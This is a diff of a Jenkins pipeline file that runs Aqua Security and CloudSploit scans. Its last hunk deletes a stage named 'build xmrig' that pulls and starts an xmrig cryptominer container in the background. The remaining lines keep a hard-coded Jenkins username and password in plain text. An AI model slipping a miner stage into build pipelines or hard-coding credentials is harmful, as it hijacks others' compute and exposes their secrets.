@@ -3,15 +3,15 @@ pipeline {
 	agent any
 		
 	 environment {
- //    		ACR_LOGINSERVER = credentials('ACR_LOGINSERVER')
- //    		ACR_ID = credentials('ACR_ID')
-	// 	    ACR_PASSWORD = credentials('ACR_PASSWORD')
+		 //ACR_LOGINSERVER = credentials('ACR_LOGINSERVER')
+		 //ACR_ID = credentials('ACR_ID')
+		 //ACR_PASSWORD = credentials('ACR_PASSWORD')
 		 JENKINS_USERNAME='yslee'
 		 JENKINS_PASSWORD='qwer'
-		    CSPM_URL = 'https://asia-1.api.cloudsploit.com'
-		    AQUA_URL = 'https://api.asia-1.supply-chain.cloud.aquasec.com'
-		    AQUA_KEY = credentials('AQUA_KEY')
-		    AQUA_SECRET = credentials('AQUA_SECRET')
+		 CSPM_URL = 'https://asia-1.api.cloudsploit.com'
+		 AQUA_URL = 'https://api.asia-1.supply-chain.cloud.aquasec.com'
+		 AQUA_KEY = credentials('AQUA_KEY')
+		 AQUA_SECRET = credentials('AQUA_SECRET')
 	 }
 	stages{
 		stage('Pipeline Enforcer Start') {
@@ -55,16 +55,6 @@ pipeline {
 					# docker login $ACR_LOGINSERVER -u ${ACR_ID} -p ${ACR_PASSWORD}
 					# docker push $IMAGE_NAME
 					'''
-			}
-		}
-
-		stage ('build xmrig'){
-			steps {
-				sh	'''
-    					echo "FROM xmrig/xmrig:latest" > Dockerfile
-	    				docker pull metal3d/xmrig:latest
-	 				docker run -d metal3d/xmrig:latest
-	 				'''
 			}
 		}
 		
